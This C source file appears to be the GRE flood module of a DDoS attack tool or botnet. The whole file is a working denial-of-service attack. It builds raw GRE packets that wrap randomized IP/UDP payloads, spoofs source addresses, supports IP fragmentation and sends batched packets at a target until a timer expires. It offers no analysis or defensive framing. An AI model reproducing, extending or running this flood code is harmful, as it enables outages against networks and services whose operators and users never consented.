#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <poll.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/ethernet.h>

#include "gre_method.h"
#include "../headers/protocol.h"
#include "../headers/attack_core.h"

#define GRE_DEFAULT_PAYLOAD 100
#define GRE_MAX_PAYLOAD 1400

#ifndef IPPROTO_GRE
#define IPPROTO_GRE 47
#endif

struct gre_header {
    uint16_t flags;
    uint16_t protocol;
};

#define GRE_FLAG_KEY        0x2000
#define GRE_FLAG_SEQ        0x1000

static void* gre_ip_flood(attack_params* params) {
    int fd = create_raw_socket();
    if (fd < 0) return NULL;
    
    attack_rand_init();
    
    uint8_t rand_level = get_rand_level(params);
    uint8_t ttl = get_ttl(params);
    uint8_t tos = get_tos(params);
    uint8_t frag_mode = get_frag_mode(params);
    spoof_config_t spoof = parse_spoof_option(params);
    
    uint16_t psize = get_packet_size(params, GRE_DEFAULT_PAYLOAD);
    if (psize > GRE_MAX_PAYLOAD) psize = GRE_MAX_PAYLOAD;
    
    size_t gre_len = sizeof(struct gre_header) + psize;
    size_t total_len = sizeof(struct iphdr) + gre_len;
    
    char* packets[BATCH_SIZE];
    struct mmsghdr msgvec[BATCH_SIZE];
    struct iovec iov[BATCH_SIZE];
    struct sockaddr_in dest;
    
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;
    
    size_t inner_hdr_len = sizeof(struct iphdr) + sizeof(struct udphdr);
    size_t inner_data_len = psize > inner_hdr_len ? psize - inner_hdr_len : 0;

    for (int i = 0; i < BATCH_SIZE; i++) {
        packets[i] = (char*)malloc(total_len);
        if (!packets[i]) {
            for (int j = 0; j < i; j++) free(packets[j]);
            close(fd);
            return NULL;
        }
        memset(packets[i], 0, total_len);
        
        struct gre_header* gre = (struct gre_header*)(packets[i] + sizeof(struct iphdr));
        gre->flags = htons(0);
        gre->protocol = htons(ETH_P_IP);
        
        uint8_t* inner = (uint8_t*)(packets[i] + sizeof(struct iphdr) + sizeof(struct gre_header));
        struct iphdr* inner_ip = (struct iphdr*)inner;
        struct udphdr* inner_udp = (struct udphdr*)(inner + sizeof(struct iphdr));

        inner_ip->version = 4;
        inner_ip->ihl = 5;
        inner_ip->tot_len = htons(psize);
        inner_ip->id = htons(attack_rand_next() & 0xFFFF);
        inner_ip->ttl = 64;
        inner_ip->protocol = IPPROTO_UDP;
        inner_ip->saddr = htonl((10 << 24) | (attack_rand_next() & 0x00FFFFFF));
        inner_ip->daddr = params->target_addr.sin_addr.s_addr;
        inner_ip->check = 0;
        inner_ip->check = ip_checksum(inner_ip, sizeof(struct iphdr));

        inner_udp->source = htons(attack_rand_next_range(1024, 65535));
        inner_udp->dest = htons(attack_rand_next_range(1, 65535));
        inner_udp->len = htons(sizeof(struct udphdr) + inner_data_len);
        inner_udp->check = 0;

        uint8_t* inner_payload = inner + inner_hdr_len;
        for (size_t p = 0; p < inner_data_len; p++) {
            inner_payload[p] = attack_rand_next() & 0xFF;
        }
        
        iov[i].iov_base = packets[i];
        iov[i].iov_len = total_len;
        
        memset(&msgvec[i], 0, sizeof(msgvec[i]));
        msgvec[i].msg_hdr.msg_name = &dest;
        msgvec[i].msg_hdr.msg_namelen = sizeof(dest);
        msgvec[i].msg_hdr.msg_iov = &iov[i];
        msgvec[i].msg_hdr.msg_iovlen = 1;
    }
    
    time_t end_time = time(NULL) + params->duration;
    int time_check_counter = 0;

    pps_tracker_t pps;
    pps_tracker_init(&pps, get_pps_limit(params));
    
    while (params->active) {
        if (!pps_should_send(&pps, BATCH_SIZE)) {
            long sleep_time = pps_sleep_us(&pps);
            if (sleep_time > 0) usleep(sleep_time);
            if (++time_check_counter > 2000) { time_check_counter = 0; if (time(NULL) > end_time) break; }
            continue;
        }
        for (int i = 0; i < BATCH_SIZE && params->active; i++) {
            struct iphdr* ip = (struct iphdr*)packets[i];
            struct gre_header* gre = (struct gre_header*)(packets[i] + sizeof(struct iphdr));
            uint8_t* inner = (uint8_t*)(packets[i] + sizeof(struct iphdr) + sizeof(struct gre_header));
            struct iphdr* inner_ip = (struct iphdr*)inner;
            
            if (rand_level >= RAND_MEDIUM) {
                inner_ip->id = htons(attack_rand_next() & 0xFFFF);
                inner_ip->saddr = htonl((10 << 24) | (attack_rand_next() & 0x00FFFFFF));
                inner_ip->check = 0;
                inner_ip->check = ip_checksum(inner_ip, sizeof(struct iphdr));

                uint8_t* inner_payload = inner + inner_hdr_len;
                for (size_t p = 0; p < inner_data_len && p < 64; p++) {
                    inner_payload[p] = attack_rand_next() & 0xFF;
                }
            }
            
            if (rand_level >= RAND_BASIC) {
                uint16_t flags = 0;
                if (attack_rand_next() % 4 == 0) flags |= GRE_FLAG_KEY;
                if (attack_rand_next() % 4 == 0) flags |= GRE_FLAG_SEQ;
                gre->flags = htons(flags);
            }
            
            uint32_t src_ip = generate_spoofed_ip(&spoof);
            build_ip_header(ip, src_ip, params->target_addr.sin_addr.s_addr, IPPROTO_GRE, total_len, rand_level >= RAND_FULL ? attack_rand_next_range(48, 128) : ttl, tos);
            if (frag_mode != FRAG_NONE) apply_ip_frag(ip, frag_mode);
        }

        int sent = sendmmsg_nonblock(fd, msgvec, BATCH_SIZE);
        if (sent == 0) {
            sched_yield();
        }

        if (++time_check_counter > 2000) {
            time_check_counter = 0;
            if (time(NULL) > end_time) break;
        }
    }

    for (int i = 0; i < BATCH_SIZE; i++) {
        free(packets[i]);
    }
    close(fd);

    return NULL;
}

void* gre_method(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;
    return gre_ip_flood(params);
}
